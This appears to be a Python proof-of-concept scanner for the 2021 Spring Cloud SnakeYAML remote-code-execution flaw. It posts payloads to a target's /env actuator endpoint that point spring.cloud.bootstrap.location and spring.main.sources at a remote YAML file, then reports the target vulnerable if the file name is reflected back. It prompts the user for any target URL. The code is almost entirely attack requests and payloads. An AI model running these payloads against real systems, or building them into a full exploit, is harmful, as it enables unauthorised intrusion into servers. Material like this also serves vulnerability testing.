import requests
requests.packages.urllib3.disable_warnings()

'''
一、漏洞成因：



组件要求：
spring-cloud-starter  && spring-boot-starter

参考链接：
https://www.cnblogs.com/hei-zi/p/14282727.html
'''


def poc(url, useragent, proxies=None):
    header1 = {
        "User-Agent": useragent,
        "Content-Type": "application/x-www-form-urlencoded"
        }
    header2 = {
        "User-Agent": useragent,
        "Content-Type": "application/json"
        }
    payload_1 = "spring.cloud.bootstrap.location=http://127.0.0.1/example.yml"
    payload_2 = "{\"name\":\"spring.main.sources\",\"value\":\"http://127.0.0.1/example.yml\"}"
    path = '/env'

    try:
        urltest = url + path
        re1 = requests.post(url=urltest, headers=header1, data=payload_1, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
        re2 = requests.post(url=urltest, headers=header2, data=payload_2, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
        
        if ('example.yml' in str(re1.text)):
            return f'[+] 2021 SnakeYAML-RCE exists. The link: --> {urltest} payload: {payload_1}'
        elif ('example.yml' in str(re2.text)):
            return f'[+] 2021 SnakeYAML-RCE exists. The link: --> {urltest} payload: {payload_2}'
        else:
            return '[-] 2021 SnakeYAML-RCE not exists.'
    except Exception as e:
        return f'[-] An error occurred and it has been logged: {e}'

if __name__ == '__main__':
    print(poc(input('请输入目标url:').strip('/'), 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36'))
